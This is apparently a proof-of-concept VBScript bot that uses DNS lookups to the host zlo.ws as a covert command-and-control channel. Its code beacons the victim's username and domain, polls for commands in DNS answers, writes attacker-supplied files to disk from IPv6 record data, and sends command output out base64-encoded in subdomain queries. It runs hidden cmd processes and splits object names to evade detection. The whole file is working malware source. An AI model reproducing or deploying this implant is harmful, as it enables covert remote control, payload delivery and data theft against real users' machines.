DOMAIN="zlo.ws" ' domain put here!!
DOMAIN=DOMAIN&"."
MsgBox("BOT.VBS agent for REVERSE DNS PoC have been started!")
GtUIn="WScr"&"ipt.Shell"
Set WShell = WScript.CreateObject(GtUIn)
uName = WShell.ExpandEnvironmentStrings("%USERNAME%")
uDomain = WShell.ExpandEnvironmentStrings("%USERDOMAIN%")
TEMP = WShell.ExpandEnvironmentStrings("%TEMP%")
ZLOBA="Script"&"ing.FileSystemObject"
Set fahudss    = CreateObject(ZLOBA)
ZLOBER= TEMP & "\asdRthbdsiu.txt"
Dim cmd(11)
Function Base64Encode(inData)
Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
Dim cOut, sOut, I
For I = 1 To Len(inData) Step 3
Dim nGroup, pOut, sGroup
nGroup = &H10000 * Asc(Mid(inData, I, 1)) + &H100 * MyASC(Mid(inData, I + 1, 1)) + MyASC(Mid(inData, I + 2, 1))
nGroup = Oct(nGroup)
nGroup = String(8 - Len(nGroup), "0") & nGroup
pOut = Mid(Base64, CLng("&o" & Mid(nGroup, 1, 2)) + 1, 1) + _
Mid(Base64, CLng("&o" & Mid(nGroup, 3, 2)) + 1, 1) + _
Mid(Base64, CLng("&o" & Mid(nGroup, 5, 2)) + 1, 1) + _
Mid(Base64, CLng("&o" & Mid(nGroup, 7, 2)) + 1, 1)
sOut = sOut + pOut
Next
Select Case Len(inData) Mod 3
Case 1:
sOut = Left(sOut, Len(sOut) - 2) + "=="
Case 2:
sOut = Left(sOut, Len(sOut) - 1) + "="
End Select
Base64Encode = sOut
End Function
Function addBuffer(IP6DATA, bytechr)
ln=Len(bytechr)
Dim returnBuffer(2)
    if ln=0 then
        IP6DATA=IP6DATA&"0000"
    elseif ln=3 then
        IP6DATA=IP6DATA&"0"&Mid(bytechr, 1, 1)&Mid(bytechr, 2, 2)
    elseif ln=1 then
        IP6DATA=IP6DATA&"00"&"0"&Mid(bytechr, 1, 1)
    elseif ln=2 then
        IP6DATA=IP6DATA&"00"&Mid(bytechr, 1, 2)
    elseif ln=4 then
        IP6DATA=IP6DATA&Mid(bytechr, 1, 2)&Mid(bytechr, 3, 2)
    end if     
    addBuffer=IP6DATA
End Function
Function MyASC(OneChar)
If OneChar = "" Then MyASC = 0 Else MyASC = Asc(OneChar)
End Function
function nslookup2(input, time)
Dim returnarray(2)
Dim ByteArray(14)
WShell.Run "cmd /c nslookup -type=aaaa "& input &" > """&ZLOBER&""" 2>&1",0,true
Set objFile = fahudss.OpenTextFile(ZLOBER, 1)
strData = objFile.ReadAll
Set objRegExpz = New RegExp
objRegExpz.IgnoreCase = False
objRegExpz.Global = True
objRegExpz.Pattern = "\sff..\:[\:\w]+\r\n"
Set myMatchez = objRegExpz.Execute(strData)
startC=0
command=""
cnt=0
mxlen=14
Dim blockArray(16)
idx=0
If myMatchez.Count > 0 Then    
    For i = 0 To myMatchez.Count-1
        IP6=myMatchez(i).Value
        IP6=Trim(Left(IP6,Len(IP6)-2))
        bytechr=""
        IP6DATA=""
        nul="00"
        returnarray(0)="next"
        if Mid(IP6, 3, 1)<>"f" then
            idx=CLng("&h"&Mid(IP6, 3, 2))\14
        else
            mxlen=CLng("&h0"&Mid(IP6, 4, 1))*2
            idx=0
        end if 
        Set objRegExpz2 = New RegExp
        objRegExpz2.IgnoreCase = False
        objRegExpz2.Global = True
        objRegExpz2.Pattern = ":"
        Set myMatchez2 = objRegExpz2.Execute(IP6)
        lst=(7-(myMatchez2.Count-1))*2
        addx=""
        chgn=0
        if myMatchez2.Count<7 then
        chgn=InStr(IP6,"::")+1
        for k = 1 to lst step 1
        addx=addx&"00"
        next
        end if
        For k = 6 To Len(IP6) Step 1
                chrz=Mid(IP6, k, 1)
                if k=chgn and chrz=":" then
                    IP6DATA=IP6DATA&addx
                elseif chrz=":" then
                    IP6DATA=addBuffer(IP6DATA,bytechr)
                    bytechr=""                    
                else
                    bytechr=bytechr&chrz
                end if
        Next
        IP6DATA=addBuffer(IP6DATA,bytechr)  
        cnt=cnt+1
        blockArray(idx)=IP6DATA
        if Mid(IP6, 3, 1)="f" then
            returnarray(0)="stop"
        end if
    next
    if returnarray(0)<>"stop" then
        returnarray(1)=""
        for k = 0 To cnt-1 Step 1
            returnarray(1)=returnarray(1)&blockArray(k)
        next
    else
        returnarray(1)=Mid(blockArray(0),1,mxlen)
    end if
End If
nslookup2=returnarray
End Function
function nslookup(input,time)
WShell.Run "cmd /c nslookup "& input &" > """&ZLOBER&""" 2>&1",0,true
WScript.Sleep time
if(time>3000)then
Set objFile = fahudss.OpenTextFile(ZLOBER, 1)
strData = objFile.ReadAll
Set objRegExpz = New RegExp
objRegExpz.IgnoreCase = False
objRegExpz.Global = True
objRegExpz.Pattern = "\d+\.\d+\.\d+\.\d+"
Set myMatchez = objRegExpz.Execute(strData)
startC=0
command=""
If myMatchez.Count > 0 Then
	For i = 0 To myMatchez.Count-1
		If myMatchez(i).Value="1.1.1.1" Then
			startC=1
			For z = 1 To myMatchez.Count-1
				If myMatchez(z).Value<>"1.1.1.1" Then
					bytez=Split(myMatchez(z).Value,".")
					idx=bytez(0)
					for x=1 to 3
						if bytez(x)<>"0" then
							cmd(idx)=cmd(idx)&chr(bytez(x))
						end if
					next
				end if
			next
		End If
	next
If startC=1 then
	for each cp in cmd
		command=command&cp
	next
	erase cmd
end if
End If
nslookup=command
else
nslookup=""
end if
end 	function
request="XR.["&uName&"]["&uDomain&"]."&DOMAIN
nslookup request,0
WScript.Sleep 200
loopVar=1
Do While loopVar=1
request="XG.["&uName&"]["&uDomain&"]."&DOMAIN
command=nslookup(request,5000)
command=Trim(command)
If  command="sleep" then
WScript.Sleep 30000
Elseif command="exit" then
request="XE.["&uName&"]["&uDomain&"]."&DOMAIN
nslookup request,0
loopVar=0
Elseif Left(command,8)="download" then
    download=Right(command,Len(command)-8)
    download=Trim(download)
    subd=Left(download,1)
    file=Right(download,Len(download)-1)
    file=Trim(file)
    start="aaaa"
    loopVar2=1
    Set fso = CreateObject(ZLOBA)
    Set FileObj = fso.CreateTextFile(file, True) 
    Do While loopVar2=1
        request=start&"."&subd&"."&DOMAIN
        res=nslookup2(request, 5000)
        data=res(1)
        For i = 1 To Len(data) Step 2
            FileObj.Write Chr(CLng("&H" & Mid(Data,i,2)))
        Next
        a1=asc(Mid(start,1,1))
        a2=asc(Mid(start,2,1))
        a3=asc(Mid(start,3,1))
        a4=asc(Mid(start,4,1))
        a1=a1+1
        if a1=123 then
            a1=97
            a2=a2+1
        End If
        if a2=123 then
            a2=97
            a3=a3+1
        end if
        if a3=123 then
            a3=97
            a4=a4+1
        end if
        if res(0)="stop" then
        loopVar2=0
        end if
        start=chr(a1)+chr(a2)+chr(a3)+chr(a4)
    Loop
Elseif command<>"" then
Str=""
WShell.Run "cmd /c echo "&command&" > """&ZLOBER&""" 2>&1",0,true
Set objFile = fahudss.OpenTextFile(ZLOBER, 1)
Str = objFile.ReadAll
BStr=Base64Encode(Str)
leng=Len(BStr)
partz=Int(leng/50)
f=0
if partz>0 then
For q=0 to partz-1 
f=q+1
part=mid(BStr,(q*50)+1,50)
request="XX."&CStr(q)&"."&part&"."&DOMAIN
nslookup request,0
next
end if
part=mid(BStr,(f*50)+1,leng-(f*50))
request="XX.FI."&part&"."&DOMAIN
nslookup request,0
end if
Loop
MsgBox("BOT.VBS agent for REVERSE DNS PoC have been stopped!")
